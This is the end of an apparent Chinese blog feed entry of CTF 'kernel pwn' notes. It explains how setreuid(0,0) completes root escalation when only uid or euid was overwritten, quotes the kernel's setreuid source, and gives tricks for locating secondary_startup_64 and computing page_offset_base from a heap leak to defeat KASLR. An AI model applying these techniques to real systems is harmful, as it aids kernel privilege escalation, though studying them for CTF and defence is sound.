title="setreuid/setregid"></a>setreuid/setregid</h2><p>内核判断用户的依据是当前进程<code>cred</code>结构体中<code>uid</code>与<code>euid</code>两个字段</p><p>特别的当我们需要提权为<code>root</code>时</p><p>必须要<code>uid</code>与<code>euid</code>两个字段<strong>都为0</strong>,linux才会认为我们是<code>root</code>用户(在做过一些尝试后,可以确认至少较高版本是这样的,至于低版本尚未确认)</p><p>如果仅有其中一个字段为<code>0</code>,内核并不会将我们视作特权用户</p><p>提权时当然最好能够同时将这<code>uid</code>与<code>euid</code>都修改为<code>0</code>,但若是条件不允许,仅仅能修改其中的一个,我们就可以利用<code>setreuid(0,0)</code>来进一步的提权</p><p>当执行<code>setreuid(0,0)</code>时,只要<code>uid</code>与<code>euid</code>中任意一个为<code>0</code>,便能够将另一个也修改为<code>0</code>,进而成为被操作系统认可的<code>root</code>用户</p><p>此外:<code>suid</code>并不具备这样的能力</p><p>看内核源码:(<code>/kernel/sys.c</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Unprivileged users may change the real uid to the effective uid</span></span><br><span class="line"><span class="comment"> * or vice versa.  (BSD-style)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If you set the real uid at all, or set the effective uid to a value not</span></span><br><span class="line"><span class="comment"> * equal to the real uid, then the saved uid is set to the new effective uid.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This makes it possible for a setuid program to completely drop its</span></span><br><span class="line"><span class="comment"> * privileges, which is often a useful assertion to make when you are doing</span></span><br><span class="line"><span class="comment"> * a security audit over a program.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The general idea is that a program which uses just setreuid() will be</span></span><br><span class="line"><span class="comment"> * 100% compatible with BSD.  A program which uses just setuid() will be</span></span><br><span class="line"><span class="comment"> * 100% compatible with POSIX with saved IDs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">long</span> __sys_setreuid(<span class="type">uid_t</span> ruid, <span class="type">uid_t</span> euid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">ns</span> =</span> current_user_ns();</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"><span class="type">kuid_t</span> kruid, keuid;</span><br><span class="line"></span><br><span class="line">kruid = make_kuid(ns, ruid);</span><br><span class="line">keuid = make_kuid(ns, euid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ruid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &amp;&amp; !uid_valid(kruid))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> ((euid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &amp;&amp; !uid_valid(keuid))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">new = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!new)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line">retval = -EPERM;</span><br><span class="line"><span class="keyword">if</span> (ruid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &#123;</span><br><span class="line">new-&gt;uid = kruid;</span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;uid, kruid) &amp;&amp;</span><br><span class="line">    !uid_eq(old-&gt;euid, kruid) &amp;&amp;</span><br><span class="line">    !ns_capable_setid(old-&gt;user_ns, CAP_SETUID))</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (euid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &#123;</span><br><span class="line">new-&gt;euid = keuid;</span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;uid, keuid) &amp;&amp;</span><br><span class="line">    !uid_eq(old-&gt;euid, keuid) &amp;&amp;</span><br><span class="line">    !uid_eq(old-&gt;suid, keuid) &amp;&amp;</span><br><span class="line">    !ns_capable_setid(old-&gt;user_ns, CAP_SETUID))</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(new-&gt;uid, old-&gt;uid)) &#123;</span><br><span class="line">retval = set_user(new);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ruid != (<span class="type">uid_t</span>) <span class="number">-1</span> ||</span><br><span class="line">    (euid != (<span class="type">uid_t</span>) <span class="number">-1</span> &amp;&amp; !uid_eq(keuid, old-&gt;uid)))</span><br><span class="line">new-&gt;suid = new-&gt;euid;</span><br><span class="line">new-&gt;fsuid = new-&gt;euid;</span><br><span class="line"></span><br><span class="line">retval = security_task_fix_setuid(new, old, LSM_SETID_RE);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">retval = set_cred_ucounts(new);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">flag_nproc_exceeded(new);</span><br><span class="line"><span class="keyword">return</span> commit_creds(new);</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">abort_creds(new);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE2(setreuid, <span class="type">uid_t</span>, ruid, <span class="type">uid_t</span>, euid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __sys_setreuid(ruid, euid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到,不考虑特权用户的情况下</p><p>要设置<code>uid</code>,必须要<code>uid,euid</code>中至少一个为目标id</p><p>要设置<code>euid</code>,必须要<code>uid,euid,suid</code>中至少一个为目标id</p><h2 id="secondary-startup-64"><a href="#secondary-startup-64" class="headerlink" title="secondary_startup_64"></a>secondary_startup_64</h2><p>一般情况下</p><p>在直接映射区<code>direct_mapping_area+0x9d000</code>的位置</p><p>会有一个函数指针<code>secondary_startup_64</code></p><p>且其就在<code>kernel text</code>开头的部分,一般等于<code>kernel text+0x70</code></p><h2 id="内存大小对kernelpwn的影响"><a href="#内存大小对kernelpwn的影响" class="headerlink" title="内存大小对kernelpwn的影响"></a>内存大小对kernelpwn的影响</h2><blockquote><p>This file implements KASLR memory randomization for x86_64. It randomizes the virtual address space of kernel memory regions (physical memory mapping, vmalloc &amp; vmemmap) for x86_64. This security feature mitigates exploits relying on predictable kernel addresses.</p></blockquote><p>kaslr主要针对以下三个区域</p><ul><li>direct mapping area</li><li>vmalloc area</li><li>virtual memory map area</li></ul><p>更多相关可以在<code>/arch/x86/mm/kaslr.c</code>中查看</p><p><code>kaslr</code>的随机化粒度是<code>256m</code>,粒度即说明kaslr随机化范围的最小单位</p><p>当分配的内存大小小于<code>256M</code>时,因为加载的内存达不到一个粒度</p><p>我们可以简单的得到:</p><p><code>page_offset_base = heap_leak &amp; 0xffffffffff0000000</code></p><p>但在 MEM &gt; 256M 的机器上,这并不总是准确的,我们只能得到本粒度的基址</p><p>因此要获得确切的基址就需要办法获得一些能够大致确定其范围的能力,不过好在一般内核pwn题内存都不会大于256m,而就算大于256m,也会优先使用较低的</p><p>当 MEM &gt; 16G时,vmemmap_base也不能使用上面的代码实现,不过好在一般也不会有这种情况</p>]]></content>
    
    
    <summary type="html">简单记一些东西</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
